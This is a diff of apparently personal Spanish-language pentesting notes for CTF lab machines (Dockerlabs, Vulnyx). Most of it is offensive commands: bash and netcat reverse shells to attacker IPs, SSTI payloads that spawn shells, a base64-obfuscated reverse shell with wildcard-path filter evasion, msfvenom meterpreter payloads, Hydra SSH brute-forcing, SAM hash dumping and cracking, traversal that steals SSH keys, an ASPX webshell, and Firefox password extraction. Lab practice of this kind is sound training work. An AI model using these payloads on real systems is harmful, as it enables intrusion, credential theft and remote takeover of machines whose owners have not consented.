@@ -1,8 +1,6 @@
-# APUNTES 
-
 ## 1.-Reverse shell:
 
-### 1.1- PHP:
+1.1- PHP:
 
 https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
 
@@ -10,31 +8,31 @@ https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell
     system("bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'");
 
 
-### 1.2- PYTHON:
+1.2- PYTHON:
 
 código:
 máquina showtimes -dockerlabs:
 
 https://github.com/dfalla/Hacking---Dockerlabs/blob/showtimes/image-11.png
 
-### 1.3- JAVA
+1.3- JAVA
 
 código:
 revisar la máquina pinguinazo -dockerlabs:
 
 https://github.com/dfalla/Hacking---Dockerlabs/blob/pinguinazo/image-4.png
 
-### 1.4- NODE
+1.4- NODE
 
 código:
 revisar la máquina nodeClimb - dockerlabs:
 
 https://github.com/dfalla/Hacking---Dockerlabs/blob/nodeclimb/image-5.png
 
-### 1.5- RUBY
+1.5- RUBY
 
 
-### 1.6- BASH
+1.6- BASH
 
 código:
 máquina showtimes -dockerlabs:
@@ -43,7 +41,10 @@ https://github.com/dfalla/Hacking---Dockerlabs/blob/showtimes/image-16.png
 
 enviar una bash desde comandos desde una máquina víctima (linux) a kali:
 
-bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'
+
+#!/bin/bash
+
+bash -c 'bash -i >& /dev/tcp/IP-KALI/443 0>&1'
 
 en kali hacemos:
 
@@ -56,6 +57,10 @@ nc -lvnp 443
 comando de ejemplo:
 
 hydra -l toctoc -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 64 -I
+
+puerto 21 
+
+hydra -l <usuario> -P <ruta_a_lista_contraseñas> -s 21 -t 4 -vV 192.168.42.193 ssh
 
 existe la posibilidad de que me conecte por ssh y esté restringido la rbash 
 
@@ -85,6 +90,10 @@ metasploit
 
 rutas de usuarios:
 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
+
+/usr/share/seclists/Usernames/Names/names.txt
+
+/usr/share/metasploit-framework/data/wordlists/unix_users.txt
 
 [+] ataque para mysql:
 
@@ -324,6 +333,9 @@ Descartamos con:
 
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c 'bash -i >& /dev/tcp/172.17.0.3/443 0>&1').read() }}
 
+{{request.application.__globals__.__builtins__.__import__('os').popen('nc -e /bin/sh 192.168.1.2 443').read()}}
+
+
 Tenemos que ver la tecnología con que trabaja la web.
 
 esto aplica para formularios, solo basta que un input sea vulnerable.
@@ -457,16 +469,12 @@ Una vez que ya estamos entro de la máquina podemos observar el archivo wp-confi
 
 E:\Hacking\APUNTES\PROTOCOLOS - HERRAMIENTAS\SAMBA netbios-ssn 139-445.txt
 
--------------------------------------------------------------------------------
-
 ## 17.- Si tenemos permisos sudo con:
 
 /usr/bin/ls
 /usr/bin/cat
 
 podemos utilizar los para enumerar (ls) y ver (cat), dentro del directorio root.
-
--------------------------------------------------------------------------------
 
 ## 18.- Para identificar el tipo de hash:
 
@@ -616,7 +624,7 @@ hay que checar si hay subdominios para agregar al etc/hosts
 
 ## 30.- RCE (Ejecución remota de comandos)
 
-si tenemos inpust puede haber varias opciones de ataque.
+si tenemos inputs puede haber varias opciones de ataque.
 
 STTI
 
@@ -729,7 +737,7 @@ bash Linux-Su-Force.sh seller rockyou.txt
 
 -------------------------------------------------------------------------------
 
-# NIVEL MEDIO:
+NIVEL MEDIO:
 pwd
 
 ## 1.- WORDPRESS
@@ -788,6 +796,10 @@ verificamos el archivo .bashrc que está en el home de cada usuario.
 	Buscar archivos dentro del sistema con el usuario con el que te has conectado :
 
 	find / -type f -user chocolatito 2>/dev/null
+
+archivos de escritura:
+
+find / -writable 2>/dev/null | grep -v -i -E 'proc|sys|dev|run|home|var|tmp'
 
 Busque la palabra password
 
@@ -1321,7 +1333,7 @@ y aparece como respuesta:
 
 /login.php y como redirreción(en letras azules) -> sms.php
 
-y si hacemos ataque de fuerza bruta al formulario de logion y me aparecen un montón de credenciales, entonces significa que debemos de hacer fuerza bruta al /login.php
+y si hacemos ataque de fuerza bruta al formulario de login y me aparecen un montón de credenciales, entonces significa que debemos de hacer fuerza bruta al /login.php
 
 hacemos fuerza bruta del formulario a /login.php, referencia, máquina swiss de dockerlabs
                                                                     
@@ -1375,6 +1387,18 @@ para el caso:
 172.17.0.2; ls
 
 172.17.0.2; bash -c  "/bin/bash -i >& /dev/tcp/172.17.0.1/443 0>&1"
+
+Otro caso es que me permita ejecutar comando en base 64:
+
+convertimos a base64
+
+nc -e /bin/bash 192.168.42.133 443
+
+bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNDIuMTMzIDQ0Mwo=
+
+/???/e??o bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNDIuMTMzIDQ0Mwo= | base64 -d | /???/b??h -e
+
+máquina yourwaf vulnyx
 
 -------------------------------------------------------------------------------
 
@@ -1754,6 +1778,13 @@ para el ataque utilizamos hydra y los nombres de usuarios son los nombres que ap
 
 hydra -L usernames.txt -P pass.txt ssh://192.168.42.141 -t 64 -I
 
+
+si tenemos un formulario de inicio de sesión
+
+También podemos interceptar con burpsuite y probar con SQLMAP y derrepente podemos ver que es vulnerable a SQLijection, solo apuntando al parámetro username.
+
+sqlmap -r shop -p username --level 3 --risk 3 --batch
+
 -------------------------------------------------------------------------------
 
 ## 67.- Crear entornos virtuales
@@ -1860,6 +1891,26 @@ cat connect.bak
 si está en un servidor web podemos verlo:
 
 curl -s http://192.168.42.158/directorio/connect.bak
+
+si tengo un archivo sam.bak o SAM.bak y al hacer 
+
+file sam.bak o file SAM.bak
+
+sam.bak: MS Windows registry file, NT/2000 or above
+
+necesito de un system.bak o SYSTEM.bak para poder ver los hashes
+
+samdump2 system.bak sam.bak > hashes.txt
+
+me aparece:
+
+admin:1005:7cc48b08335cd858aad3b435b51404ee:556a8f7773e850d4cf4d789d39ddaca0:::
+
+Crackear 
+
+john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+
 
 -------------------------------------------------------------------------------
 
@@ -2141,7 +2192,7 @@ si está instalado me mostrará algo como
 
 sqlite3 database.db
 
-Dentro de SQLite3:
+# Dentro de SQLite3:
 .tables          # Listar tablas
 .schema users    # Ver estructura de la tabla 'users'
 SELECT * FROM users;  # Consulta SQL
@@ -2179,7 +2230,7 @@ entonces ejecutamos:
 
 primero hacemos ss -ltun para ver el puerto dónde se ejecuta el software
 
-port forwarding
+PORT FORWARDING
 
 realiza una redirección de puertos (port forwarding) para permitir que conexiones externas al puerto 10001 se redirijan al puerto 10000 en localhost (la misma máquina víctima)
 
@@ -2201,7 +2252,65 @@ Redirige el tráfico recibido en el puerto 10001 al puerto 10000 en la direcció
 &:
 Ejecuta el proceso en segundo plano (para que no bloquee la terminal).
 
-referencia máquia psmyn vulnyx
+referencia máquia psymin vulnyx
+
+
+otra forma:
+
+al hacer ss -tuln
+
+Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port 
+
+tcp  LISTEN  0    128    127.0.0.1:22        0.0.0.0:*   
+
+Netid  -> tcp  
+State  ->  LISTEN  
+Recv-Q -> 0
+Send -> 128    
+Local Address:Port -> 127.0.0.1:22
+Peer Address:Port -> 0.0.0.0:*
+
+
+Primero, obtengamos un shell en Metasploit y luego realicemos el reenvío de puertos. Hay muchas otras maneras de realizar el reenvío de puertos, pero la de Metasploit es más simple y sencilla. Para obtener un shell en Metasploit, primero cree un archivo elf con msfvenom y luego enviar a la máquina víctima mediante un servidor Python3.
+
+msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=IP-kali LPORT=PORT-KALI -f elf -o shel.elf
+
+lo suimos a la máquia víctima:
+
+# Python server
+$ python3 -m http.server 80
+
+una vez subida le damos chmod +x shel.elf
+
+msfconsole -q
+
+use exploit/multi/handler
+set payload linux/x64/meterpreter_reverse_tcp
+set LHOST=IP-KALI
+set LPORT=PORT-shel.elf
+run
+
+Ahora reenvíemos nuestro puerto 22 a nuestra máquina atacante usando:
+
+portfwd add -l <LOCAL_PORT> -p <REMOTE_PORT> -r <REMOTE_IP>
+
+portfwd add -l 101 -p 22 -r 127.0.0.1
+
+-l para puerto local
+-p para puerto remoto
+-r host remoto
+
+Ahora obtengamos un shell , para este caso usando ssh
+
+me tiene que salir el siguiente mensaje:
+
+[*] Forward TCP relay created: (local) :101 -> (remote) 127.0.0.1:22
+
+
+ssh root@127.0.0.1 -p 101
+
+escribimos la contraseña
+
 
 -------------------------------------------------------------------------------
 
@@ -2265,5 +2374,231 @@ cracking Johntheripper
 
 john --wordlist=/usr/share/wordlists/rockyou.txt --forma=bcrypt hash.txt
 
+-------------------------------------------------------------------------------
+
+## 87.- Siempre que tengamos la versión de un software, CMS hay que buscar por versiones altas también
+
+Ejemplo
+
+Tengo el CMS Joomla 4.2.7 pero también puedo buscar por Joomla 4.2.
+
+searchsploit Joomla 4.2.7
+
+o 
+
+searchsploit Joomla 4.2.
+
+y probar con cuál me funciona
+
+
+-------------------------------------------------------------------------------
+
+## 88.- Si no podemos ejecutar comando como ifconfig o ip a, es porque estmos dentro de un contenedor.
+
+tenemos que ser root y ver algún id_rsa o algo para conectarme por ahí
+
+estando en contenedor no me permite ver archivos dentro de carpetas dentro de usuarios del sistema incluso siendo root.
+
+-------------------------------------------------------------------------------
+
+## 89.- Si dentro de la máquina encontramos un dominio como:
+
+www.yourwaf.nyx entonces guardamos en el /etc/hosts lo siguiente
+
+IP-VÍCTIMA                         www.yourwaf.nyx yourwaf.nyx
+
+y procedemos a hacer fuzzing web a cualquier de los 2 dominios
+
+## 90.- Si tenemos un código, hay que leerlo y entender que es lo que hacer, me puede llevar a ver id_rsa, contraseñas, etc
+
+
+
+ejemplo archivo server.js  máquina yourwaf vulnyx
+
+curl -o id_rsa 'http://www.yourwaf.nyx:3000/readfile?api-token=8c2b6a304191b8e2d81aaa5d1131d83d&file=../../../../home/tester/.ssh/id_rsa'
+
+-------------------------------------------------------------------------------
+
+## 90.- Multiplexación de servicios.
+
+Se utiliza un puerto para diferentes servicios
+
+por ejemplo se puede utilizar ssh y http en un puerto por ejemplo 21 que corresponde a ftp.
+
+puedo hacer fuzzing web con http://192.168.42.193:21/
+
+para analizar lo que hay en http uso curl
+
+sin http por delante:
+
+curl IP-VICTIMA:21
+
+referencia máquina plex vulnyx 
+
+-------------------------------------------------------------------------------
+
+## 91.- Si tenemos un servidor samba relacionado con un servidor web y tenemos permisos de escritura en el servidor samba
+
+primero debemos ver las cabecera del servidor web, para ver si es linux o windows
+
+curl http://IP-VICTIMA:PORT -I
+
+si en la cabecera encontramos algo como:
+
+X-AspNet-Version: 4.0.30319
+
+se trata de un servidor windows.
+
+entonces subimos una windows:
+
+https://github.com/d4t4s3c/OffensiveReverseShellCheatSheet/blob/master/webshell.aspx
+
+configuramos en :
+
+psi.FileName="bash"
+ps.Arguments="-c "+arg;
+
+intrusión
+
+accedemos a la webshell
+
+http://IP-VICTIMA:port/webshell.aspx
+
+nos aparece un input con el label comand
+
+y ejecutamos:
+
+'bash -c "bash -i >& /dev/tcp/IP-KALI/PORT 0>&1"'
+
+o
+
+'sh -i >& /dev/tcp/IP-KALI/PORT 0>&1'
+
+en kali:
+
+nc -lnvp PORT
+
+- Podemos también ver otros archivos como id_rsa si se está ejecutando ssh en el sistema.
+
+'cat .ssh/id_rsa'
+
+'ls -la'
+
+-------------------------------------------------------------------------------
+
+## 92.- Cuando ejecutamos un escaneo con nmap, y tenemos puerto http abiertos, hay que fijarnos que métodos podemos ejecutar.
+
+si es PUT podemos subir una reverse shell o webshell
+
+EJEMPLO
+
+curl -X PUT --upload-file test.txt http://IP-VÍCTIMA:8080
+
+
+si no me permite suir un revshell.php y me sale un 404 Not Found y está tamién que se puede usar el método MOVE, entonces subimos un revshell con la extensión .txt y con el método MOVE le cambiamos la extensión.
+
+cambiar la extensión
+
+curl -X MOVE -H "Destination: http://IP-VÍCTIMA:8080/shell.php" http://IP-VÍCTIMA:8080/shell.txt
+
+-------------------------------------------------------------------------------
+
+## 93.- La primera línea de un id_rsa es:
+
+-----BEGIN RSA PRIVATE KEY-----
+
+y la última:
+
+-----END RSA PRIVATE KEY-----
+
+## 94.- Cuando al descomprimir  un backup.zip tenemos no sale una carpeta mozila y dentro de ella una carpeta firefox, podemos usar la siguiente herramienta para ver que es lo que hay dentro.
+
+https://github.com/unode/firefox_decrypt/blob/main/firefox_decrypt.py
+
+forma de uso:
+
+nos paramos en la misma carpeta donde se encuentra mozilla
+
+python3 decript.py mozila/firefox
+
+elegimos la opción 2
+
+y nos motrará información como:
+
+Website:   http://localhost
+Username: 'marco'
+Password: 'm@rc0!123'
+
+-------------------------------------------------------------------------------
+
+## 95.- Si encuentro un archivo de cofiguración de algún servidor web que contenga algo parecido a esto:
+
+server {
+	listen 80 default_server;
+	listen [::]:80 default_server;
+
+	root /var/www/html;
+
+	index index.html index.htm index.nginx-debian.html;
+
+	server_name _;
+
+	location / {
+		try_files $uri $uri/ =404;
+	}
+	
+        location /bak {
+                alias /var/backups/;
+        }
+}
+
+ver la parte de location /bak 
+
+indica que las solicitudes a /bak accederán al directorio /var/backups/ del servidor.
+
+el error de configuración está en que en la parte de location debe ir como /bak/ y no como /bak, le falta el slash al final
+
+podemos hacer LFI como /bak../otros/directorios/archivos
+
+realizo fuerza bruta de directorios en esa ruta
+
+wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/big.txt 192.168.42.200/bak../FUZZ
+
+supongamos que me dió un resultado como:
+
+000003048:   301        7 L      11 W       169 Ch      "backups"                                                                                             
+000003933:   301        7 L      11 W       169 Ch      "cache"                                                                                               
+000010777:   301        7 L      11 W       169 Ch      "lib"                                                                                                 
+000011026:   301        7 L      11 W       169 Ch      "lock"                                                                                                
+000011035:   301        7 L      11 W       169 Ch      "log"                                                                                                 
+000011004:   301        7 L      11 W       169 Ch      "local"                                                                                               
+000011235:   301        7 L      11 W       169 Ch      "mail"                                                                                                
+000013120:   301        7 L      11 W       169 Ch      "opt"                                                                                                 
+000015701:   301        7 L      11 W       169 Ch      "run"                                                                                                 
+000017016:   301        7 L      11 W       169 Ch      "spool"                                                                                               
+000018179:   301        7 L      11 W       169 Ch      "tmp"                                                                                                 
+000020075:   301        7 L      11 W       169 Ch      "www"
+
+un archivo importante sería log
+
+lo enumeramos
+
+wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/common.txt -z list,log 192.168.42.200/bak../log/FUZZ.FUZ2Z
+
+resultado:
+
+000000749:   200        6 L      73 W       560 Ch      "auth - log"
+
+para ver los logs:
+
+curl -S http://192.168.42.200/bak../log/auth.log
+
+-------------------------------------------------------------------------------
+
+## 96.- Si al hacer fuzzing web no encontramos nada, entonces hacemos fuzzing por parámetros
+
+wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 'http://192.168.42.200:8080/?FUZZ'
+
+y según lo encontremos podemos aplicar XSS, SSTI o hasta LFI
 
 
